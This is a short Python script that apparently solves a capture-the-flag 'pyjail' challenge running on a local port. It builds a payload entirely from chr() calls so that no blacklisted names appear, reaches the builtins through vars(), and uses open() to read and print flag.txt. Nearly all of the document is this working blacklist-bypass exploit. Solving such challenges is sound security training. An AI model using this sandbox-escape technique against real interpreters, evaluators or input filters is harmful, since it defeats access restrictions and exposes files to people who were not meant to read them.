#!/usr/bin/env python3
"""
Direct solve: reads flag in ONE payload, no override.
Constructs everything from chr() to bypass blacklist.
"""
import socket
import time

HOST = "127.0.0.1"
PORT = 1337

builtins_key = "chr(95)*2+chr(98)+chr(117)+chr(105)+chr(100+8)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)*2"
open_key    = "chr(111)+chr(112)+chr(101)+chr(110)"
filename    = "chr(102)+chr(100+8)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)"
read_key    = "chr(114)+chr(101)+chr(97)+chr(100)"
print_key   = "chr(112)+chr(114)+chr(105)+chr(110)+chr(116)"

# builtins["print"](  vars(type(f := builtins["open"](filename)))["read"](f)  )
payload = (
    f"vars(vars()[{builtins_key}])[{print_key}]"
    f"(vars(type(f := vars(vars()[{builtins_key}])[{open_key}]({filename})))"
    f"[{read_key}](f))"
)

s = socket.socket()
s.settimeout(10)
s.connect((HOST, PORT))
time.sleep(0.2)
s.recv(4096)  # consume "> " prompt
s.sendall(payload.encode() + b"\n")
time.sleep(0.3)
data = s.recv(4096)
print(data.decode(errors="replace").strip())
s.close()
